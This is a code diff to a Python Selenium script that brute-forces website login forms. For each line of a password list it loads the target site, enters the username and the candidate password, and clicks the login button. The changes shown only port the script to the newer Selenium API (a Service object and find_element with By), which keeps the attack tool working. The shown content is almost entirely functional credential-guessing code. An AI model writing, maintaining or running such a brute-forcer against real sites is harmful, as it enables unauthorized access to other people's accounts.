@@ -13,7 +13,7 @@ from selenium.common.exceptions import NoSuchElementException
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-
+from selenium.webdriver.chrome.service import Service
 
 
 #Graphics
@@ -81,18 +81,19 @@ def wizard():
 def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
     f = open(pass_list, 'r')
     optionss = webdriver.ChromeOptions()
+    service = Service(executable_path='./chromedriver.exe');
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
-    browser = webdriver.Chrome(chrome_options=optionss)
+    browser = webdriver.Chrome(service=service, options=optionss)
     wait = WebDriverWait(browser, 10)
     while True:
         try:
             for line in f:
                 browser.get(website)
                 wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
-                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
-                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
-                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
+                Sel_user = browser.find_element(By.CSS_SELECTOR,username_selector) #Finds Selector
+                Sel_pas = browser.find_element(By.CSS_SELECTOR,password_selector) #Finds Selector
+                enter = browser.find_element(By.CSS_SELECTOR,login_btn_selector) #Finds Selector
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
                 print ('------------------------')
@@ -136,6 +137,3 @@ website = options.website
 pass_list = options.passlist
 print (banner)
 brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
-
-
-
